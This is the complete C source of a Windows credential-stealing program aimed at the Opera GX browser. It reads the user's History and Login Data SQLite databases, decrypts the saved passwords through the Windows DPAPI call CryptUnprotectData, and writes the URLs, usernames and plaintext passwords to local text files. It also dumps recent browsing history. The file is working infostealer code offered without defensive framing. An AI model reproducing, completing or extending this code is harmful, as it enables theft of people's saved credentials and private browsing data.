#include <stdio.h>
#include <Windows.h>
#include "sqlite3.h"

#pragma comment(lib, "Crypt32.lib")

int get_history(char* filename) {
    sqlite3* db;
    char* errMsg = 0;
    sqlite3_stmt* stmt;
    int rc;
    const char* sql = "select url,visit_count from urls order by id desc limit 20;";
    FILE* fp;

    fopen_s(&fp, "urls.txt", "a+");
    if (fp == NULL) {
        printf("Fail");
        return 1;
    }
    rc = sqlite3_open(filename, &db);
    if (rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        return 1;
    }
    else {
        fprintf(stderr, "Opened database\n");
    }

    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    // Execute SQL statement
    int i = 1;
    while ((sqlite3_step(stmt) == SQLITE_ROW)) {
        char* url = sqlite3_column_text(stmt, 0);
        int vist_count = (int)sqlite3_column_int(stmt, 1);
        fprintf(fp, "[%d] %s | %d\n", i, url, vist_count);
        fprintf(fp, "===============================\n\n");
        i += 1;
    }

    // Close the database connection
    sqlite3_close(db);
    fclose(fp);

    return 0;
}


//int decrpyt_password(const unsigned char* encrypted_password, int len, char* decrypted_password, int max_len) {
//    DATA_BLOB in_blob, out_blob;
//    in_blob.pbData = (BYTE*)encrypted_password;
//    in_blob.cbData = len;
//
//    if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
//        if (out_blob.cbData > max_len - 1) {
//            printf("Buffer To Small For Password");
//            return 0;
//        }
//        memcpy(decrypted_password, out_blob.pbData, out_blob.cbData);
//        decrypted_password[out_blob.cbData] = '\0';
//        LocalFree(out_blob.pbData);
//        return 1;
//    }
//    else {
//        printf("Failed To Decrpyt Password\n");
//        return 0;
//    }
//}

int decrypt_password(unsigned char* encrypted_password, int len, unsigned char* decrypted_password, int max_len) {
    DATA_BLOB in_blob, out_blob;
    in_blob.pbData = (BYTE*)encrypted_password;
    in_blob.cbData = len;

    if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
        // Ensure we don't exceed the buffer
        if (out_blob.cbData > max_len - 1) {
            printf("Decrypted password is too large for buffer\n");
            LocalFree(out_blob.pbData);
            return 0;
        }
        memcpy(decrypted_password, out_blob.pbData, out_blob.cbData);
        decrypted_password[out_blob.cbData] = '\0';  // Null terminate the string
        printf("%s\n", decrypted_password);
        LocalFree(out_blob.pbData);
        return 1;  // Success
    }
    else {
        printf("%lu\n", GetLastError());
        return 0;  // Failure
    }
}


int get_passwords(char* filename) {
    sqlite3* db;
    char* errMsg = 0;
    sqlite3_stmt* stmt;
    int rc;
    const char* pas = "select action_url, username_value, password_value from logins;";
    FILE* fp;

    fopen_s(&fp, "passwords.txt", "a+");
    if (fp == NULL) {
        printf("Failed Opening passwords.txt\n");
        return 1;
    }
    rc = sqlite3_open(filename, &db);
    if (rc) {
        printf("Failed Opening Database\n");
        return 1;
    } 
    printf("Opened %s\n\n", filename);

    rc = sqlite3_prepare_v2(db, pas, -1, &stmt, NULL);
    int i = 1;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        char* url = (char*)sqlite3_column_text(stmt, 0);
        char* user = (char*)sqlite3_column_text(stmt, 1);
        unsigned char* password = (unsigned char*)sqlite3_column_blob(stmt, 2);
        int encrpt_len = sqlite3_column_bytes(stmt, 2);
        char decrypted_password[500];

        if (decrypt_password(password, encrpt_len, decrypted_password, sizeof(decrypted_password))) {
            fprintf(fp, "[%d] %s | %s | %s \n", i, url, user, decrypted_password);
            fprintf(fp, "============================\n\n");
        }
        else {
            fprintf(fp, "[%d] %s | %s | [Failed Getting Password]\n", i, url, user);
            fprintf(fp, "============================\n\n");
        }


        
        i += 1;
    }

    sqlite3_close(db);
    fclose(fp);
    return 0;

}


int main(int argc, char* argv[]) {
   
    
    char* name = getenv("USERPROFILE");
    char filename[512];

    char paths[2][512];
    snprintf(paths[0], sizeof(paths[0]), "%s\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History", name);
    snprintf(paths[1], sizeof(paths[1]), "%s\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data", name);
    
    printf("%s\n", paths[0]);
    

    
    printf("[*] Getting Browsing History...\n");
    int check = get_history(paths[0]);
    
    if (check == 1) {
        printf("Failed Getting History...");
        return 1;
    } 
    printf("[*] Extracted Browsing Histroy!\n[+] Written Too Urls.txt\n");

    printf("[+] Extracting Passwords...\n\n");
    get_passwords(paths[1]);

    return 0;
}
